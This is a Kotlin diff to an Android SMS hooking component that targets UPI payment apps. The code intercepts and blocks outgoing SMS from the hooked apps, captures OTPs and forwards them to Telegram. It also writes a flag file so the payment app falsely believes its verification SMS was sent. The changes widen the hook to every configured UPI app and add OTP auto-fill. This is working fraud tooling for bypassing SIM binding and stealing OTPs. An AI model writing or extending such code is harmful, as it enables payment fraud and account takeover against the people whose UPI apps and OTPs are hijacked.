@@ -24,8 +24,7 @@ object OutgoingSmsGuard {
 
     fun refresh(context: Context) {
         val config = ConfigManager(context).load()
-        val activeHook = ActiveHookManager.readActivePackage()
-        val hookActive = !activeHook.isNullOrBlank() && config.hookedUpiApps[activeHook] == true
+        val hookActive = config.hookedUpiApps.any { it.value }
         val shouldBlock = (config.hookOutgoingSms || config.interceptFakeSuccess) && hookActive
 
         if (shouldBlock && !blocked) {
@@ -79,9 +78,14 @@ object OutgoingSmsGuard {
                 capturedAt = System.currentTimeMillis()
             )
             OtpCaptureWriter.write(context, otp)
+            OtpAutoFillHelper.onHookedOtpCaptured(context, config, otp)
             if (SmsMatcher.shouldForwardToTelegram(config, dest, body, "outgoing")) {
                 TokenForwarder(configManager, context).forward(otp)
             }
+            // Fake success — app ko lagta hai SMS send ho gaya (LSPosed intercept style)
+            try {
+                java.io.File("/data/local/tmp/hivirtus_outgoing_fake_ok.flag").writeText("ok")
+            } catch (_: Exception) {}
             flag.delete()
         } catch (e: Exception) {
             Log.w(TAG, "Blocked flag process failed: ${e.message}")
